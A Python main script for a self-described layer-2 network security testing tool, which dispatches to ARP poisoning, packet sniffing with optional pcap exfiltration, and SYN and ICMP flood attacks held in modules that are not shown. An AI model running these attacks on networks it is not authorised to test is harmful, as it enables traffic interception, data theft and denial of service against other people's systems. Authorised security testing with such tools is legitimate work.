#!/usr/bin/python3
#from core.DHCP.dhcp import dhcpAttacks
#from core.ICMP.icmpRedirect import redirect

import argparse
from core.ARP.arp import arpPoison
from core.SNIFFER.sniffer import sniffer
from core.DOS.dos import DoS
from core.SNIFFER.exfiltration import pcapExfiltration

def main():
    parser = argparse.ArgumentParser(description = "A small framework for testing a network's security of layer 2 technologies.", usage = "Hello world!")
    parser.add_argument("-at", help = "Attack type: str (ARP|arp sniffert|SNIFFERT)", type = str, dest = "attackType",action = "store", required = True)
    parser.add_argument("-g", help = "Default Gateway variable, necessary for some attacks (str)", type = str, dest = "gateway", action = "store")
    parser.add_argument("-t", help = "Target IP Address variable (str)", type = str, dest = "targetIP", action = "store")
    parser.add_argument("-tL", help = "List of Target IP Addresses for ARP (list)", nargs = "+", type = str, dest = "targetIPList", action = "store") #IF TRUE THEN NULL -tIP
    parser.add_argument("-bpf", help = "Berkeley Packet Filter variable for Sniffer (str)", type = str, dest = "bpf", action = "store")
    parser.add_argument("-c", help = "Total packet count for Sniffer (int)", type = int, dest = "count", action = "store")
    parser.add_argument("-exfil", help = "completes for Sniffer file (str)", const = True, nargs = "?", type = str, dest = "exfil", action = "store")

    
    args = parser.parse_args()

    if args.attackType == "arp" or args.attackType == "ARP":
        if args.targetIP == None and args.targetIPList == None:
            exit("There has been no supplied target argument. Please input an IP Address.")
        
        if args.targetIPList:
            args.targetIP = None

        if not args.targetIPList:
            targetIP = "".join(args.targetIP)
            ARP = arpPoison(args.gateway, targetIP, args.targetIPList)

        ARP = arpPoison(args.gateway, args.targetIP, args.targetIPList)

        ARP.initialSetup()

        print("[-] Starting attack")
        if args.targetIPList:
            try:
                while True:
                    ARP.poisonListOfHosts()

            except Exception:
                ARP.arpMultipleTableRestore()
        else:
            try:
                while True:
                    ARP.poisonHost()
                    ARP.poisonRouter()
            
            except Exception:
                ARP.arpTableRestore()
        exit()

    if args.attackType == "sniffer_terminal" or args.attackType == "SNIFFER_TERMINAL":
        pktSniffer = sniffer(args.count, args.bpf)
        pktSniffer.sniffToTerminal()

    if args.attackType == "sniffer_file" or args.attackType == "SNIFFER_FILE":
        pktSniffer = sniffer(args.count, args.bpf)
        pktSniffer.sniffToFile()
        
        if args.exfil == True:
            exfiltration = pcapExfiltration("PiTak.pcap")
            exfiltration.upload()

    if args.attackType == "syn" or args.attackType == "SYN":
        denial = DoS(args.targetIP)
        denial.synFlood()

    if args.attackType == "icmp" or args.attackType == "ICMP":
        denial = DoS(args.targetIP)
        denial.icmpFlood()

main()
